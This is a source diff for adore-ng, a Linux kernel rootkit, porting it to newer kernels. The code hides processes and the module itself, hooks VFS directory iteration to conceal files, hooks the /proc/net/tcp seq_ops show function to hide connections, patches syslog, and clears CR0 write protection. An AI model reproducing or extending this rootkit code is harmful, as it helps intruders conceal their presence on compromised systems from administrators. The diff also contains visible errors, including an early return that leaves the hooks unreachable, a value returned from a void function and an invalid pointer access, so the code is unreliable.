@@ -52,6 +52,10 @@
 #include <linux/sysfs.h>
 #include <linux/version.h>
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
+#include <linux/sched/signal.h>
+#endif
+
 #include "adore-ng.h"
 
 #define LOG_ADORE	""
@@ -59,6 +63,8 @@
 /* Module parameter. */
 static int hide_pid = 0xFFFFFFFF;
 module_param(hide_pid, int, 0);
+static int no_kern_patch = 0;
+module_param(no_kern_patch, int, 0);
 
 #ifdef __x86_64__
 uint64_t orig_cr0;
@@ -127,6 +133,7 @@ iterate_dir_t orig_opt_iterate = NULL;
 iterate_dir_t orig_proc_iterate = NULL;
 #endif
 
+struct seq_operations *seq_ops;
 struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                    struct nameidata *) = NULL;
 
@@ -585,7 +592,7 @@ int patch_vfs(const char *p,
 	new_op->iterate = new_iterate;
 #else
 	new_op->iterate_shared = new_iterate;
-	printk(LOG_ADORE"patch vfs     : %p --> %p\n", *orig_iterate, new_iterate);
+	printk(LOG_ADORE"patch vfs     : %016lX --> %016lX\n", *orig_iterate, new_iterate);
 #endif
 
 	filep->f_op = new_op;
@@ -613,10 +620,10 @@ int unpatch_vfs(const char *p,
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	new_op->readdir = orig_readdir;
 #elif (LINUX_VERSION_CODE < KERNEL_VERSION(4, 8, 0))
-	printk(LOG_ADORE"unpatch vfs     : %p --> %p\n", new_op->iterate, orig_iterate);
+	printk(LOG_ADORE"unpatch vfs     : %016lX --> %016lX\n", new_op->iterate, orig_iterate);
 	new_op->iterate = orig_iterate;
 #else
-	printk(LOG_ADORE"unpatch vfs     : %p --> %p\n", new_op->iterate_shared, orig_iterate);
+	printk(LOG_ADORE"unpatch vfs     : %016lX --> %016lX\n", new_op->iterate_shared, orig_iterate);
 	new_op->iterate_shared = orig_iterate;
 #endif
 
@@ -686,28 +693,33 @@ void kobject_unregister(struct kobject * kobj)
 #endif
 
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0))
-struct tcp_seq_afinfo *proc_find_tcp_seq(void)
+struct seq_operations *proc_find_tcp_seq(void)
 {
 	struct proc_dir_entry *pde = init_net.proc_net->subdir;
 
 	while (strcmp(pde->name, "tcp"))
 		pde = pde->next;
 
-	return (struct tcp_seq_afinfo*)pde->data;
+	return &(((struct tcp_seq_afinfo*)pde->data).seq_ops);
 }
 #else
-struct tcp_seq_afinfo *proc_find_tcp_seq(void)
+struct seq_operations *proc_find_tcp_seq(void)
 {
 	struct file *filep;
 	struct tcp_seq_afinfo *afinfo;
+	struct seq_operations *sops;
 
 	filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
 	if(!filep) return NULL;
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 18, 0)
 	afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
+	sops = &(afinfo->seq_ops);
+#else
+	sops = PDE(filep->f_path.dentry->d_inode)->seq_ops;
+#endif
 	filp_close(filep, 0);
-
-	return afinfo;
+	return sops;
 }
 #endif
 #define NET_CHUNK 150
@@ -822,8 +834,6 @@ static int patch_syslog(void)
 	return 0;
 }
 
-struct tcp_seq_afinfo *t_afinfo = NULL;
-
 int __init adore_init(void)
 {
 	struct file_operations *new_op;
@@ -846,6 +856,8 @@ int __init adore_init(void)
 	printk(LOG_ADORE"	   ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░░   ░    ░            ░   ░ ░ ░ ░   ░ \n");
 	printk(LOG_ADORE"	         ░  ░   ░        ░ ░     ░        ░  ░               ░       ░ \n");
 	printk(LOG_ADORE"			            ░                                                       \n"); 
+
+	return 0;
 
 	/* Hide process. */
 	if (hide_pid != -1)
@@ -871,6 +883,12 @@ int __init adore_init(void)
 	n->prev = p;
 	p->next = n;
 
+	/* If no_kern_patch is set, just hide module and process. */
+	if (no_kern_patch == 1)
+	{
+		goto EXIT;
+	}
+
 	/* Patch function pointers. */
     filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep))
@@ -894,12 +912,13 @@ int __init adore_init(void)
 		patch_vfs(opt_fs, &orig_opt_iterate, adore_opt_iterate);
 #endif
 
-	t_afinfo = proc_find_tcp_seq();
-	if (t_afinfo) {
-		orig_tcp4_seq_show = t_afinfo->seq_ops.show;
-		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
-		printk(LOG_ADORE"patch proc_net: %p --> %p\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
+	seq_ops = proc_find_tcp_seq();
+	if (seq_ops) {
+		orig_tcp4_seq_show = seq_ops->show;
+		seq_ops->show = adore_tcp4_seq_show;
+		printk(LOG_ADORE"patch proc_net: %016lX --> %016lX\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
 	}
+
 	patch_syslog();
 
 	j = 0;
@@ -921,8 +940,9 @@ int __init adore_init(void)
 	filp_close(filep, 0);
 
 	setback_cr0(orig_cr0);
-	
-	printk(LOG_ADORE"Adore-ng v2.0 is now activated!\n"); 
+
+EXIT:
+	printk(LOG_ADORE"Adore-ng v2.5 is now activated!\n");
 	
 	return 0;
 }
@@ -934,10 +954,16 @@ void __exit adore_cleanup(void)
 	int i = 0, j = 0;
 	struct file *filep;
 
-	if (t_afinfo && orig_tcp4_seq_show)
+	/* If no_kern_patch is set, just hide module and process. */
+	if (no_kern_patch == 1)
 	{
-		printk(LOG_ADORE"unpatch proc_net: %p --> %p\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
-		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
+		return 0;
+	}
+
+	if (seq_ops && orig_tcp4_seq_show)
+	{
+		printk(LOG_ADORE"unpatch proc_net: %016lX --> %016lX\n", seq_ops->show, orig_tcp4_seq_show);
+		seq_ops->show = orig_tcp4_seq_show;
 	}
 
 	orig_cr0 = clear_return_cr0();
